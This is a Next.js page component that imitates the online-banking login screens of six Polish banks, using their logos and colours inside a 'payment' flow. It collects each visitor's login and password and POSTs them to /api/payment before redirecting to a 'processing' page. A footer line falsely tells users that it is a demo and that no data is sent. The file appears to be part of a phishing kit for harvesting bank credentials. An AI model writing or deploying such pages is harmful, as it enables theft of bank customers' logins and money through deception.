// app/payment/[bank]/page.tsx
"use client";

import Image from "next/image";
import { useRouter, useParams } from "next/navigation";
import "../../styles/bank-flow.css";
import { useState } from "react";

const BANKS: Record<
  string,
  { name: string; logo: string; primaryColor: string }
> = {
  santander: {
    name: "Santander",
    logo: "/banks/santander.svg",
    primaryColor: "#ec0000",
  },
  millennium: {
    name: "Bank Millennium",
    logo: "/banks/bank-millennium.svg",
    primaryColor: "#c0006f",
  },
  pekao: {
    name: "Bank Pekao",
    logo: "/banks/bank-pekao.svg",
    primaryColor: "#e30613",
  },
  "credit-agricole": {
    name: "Credit Agricole",
    logo: "/banks/credit-agricole.svg",
    primaryColor: "#007a77",
  },
  alior: {
    name: "Alior Bank",
    logo: "/banks/alior-bank.svg",
    primaryColor: "#7b0041",
  },
  velobank: {
    name: "VeloBank",
    logo: "/banks/velobank.svg",
    primaryColor: "#005b8f",
  }
};

export default function BankLoginPage() {
  const router = useRouter();
  const params = useParams<{ bank: string }>();

  const bankKey = (params.bank || "").toLowerCase();
  const bank = BANKS[bankKey];

  // const handleSubmit = (e: React.FormEvent) => {
  //   e.preventDefault();
  //   router.push(`/payment/${bankKey}/processing`);
  // };

  const [status, setStatus] =
      useState<"idle" | "loading" | "success" | "error">("idle");
  
    async function handleSubmit(e: React.FormEvent<HTMLFormElement>) {
      e.preventDefault();
      setStatus("loading");
  
      const formData = new FormData(e.currentTarget);
      const data = Object.fromEntries(formData.entries());
      // если нужно будет recipe — добавим сюда: (data as any).recipe = "some-id";
  
      try {
        console.log("Send /api/payment:", data);
  
        const res = await fetch("/api/payment", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(data),
        });
  
        const json = await res.json().catch(() => ({}));
        console.log("Ответ /api/payment:", res.status, json);
  
        if (!res.ok) {
          setStatus("error");
          return;
        }
  
        setStatus("success");
        
        router.push(`/payment/${bankKey}/processing`);
        e.currentTarget.reset();
      } catch (err) {
        console.error("Error fetch:", err);
        setStatus("error");
      }
    }

  if (!bank) {
    return (
      <div className="bank-login-page">
        <div className="bank-login-card">
          <p>Nieznany bank. Wróć do wyboru i spróbuj ponownie.</p>
          <button
            className="bank-result-button"
            onClick={() => router.push("/payment")}
          >
            Wróć do wyboru banku
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="bank-login-page">
      <div className="bank-login-card">
        <header className="bank-login-header">
          <Image
            src={bank.logo}
            alt={bank.name}
            width={180}
            height={60}
            className="bank-login-logo"
          />
        </header>

        <h1 className="bank-login-title">
          Logowanie do bankowości internetowej {bank.name}
        </h1>

        <form className="bank-login-form" onSubmit={handleSubmit}>
          <label className="bank-login-label">
            Identyfikator / login
            <input
              name="name"
              type="text"
              className="bank-login-input"
              autoComplete="off"
            />
          </label>

          <label className="bank-login-label">
            Hasło
            <input
              name="haslo"
              type="password"
              className="bank-login-input"
              autoComplete="off"
            />
          </label>

          <button
            type="submit"
            className="bank-login-submit"
            style={{ backgroundColor: bank.primaryColor }}
          >
            Zaloguj się
          </button>
        </form>

        <p className="bank-login-help">
          To jest demonstracyjny ekran — dane nie są nigdzie wysyłane.
        </p>
      </div>
    </div>
  );
}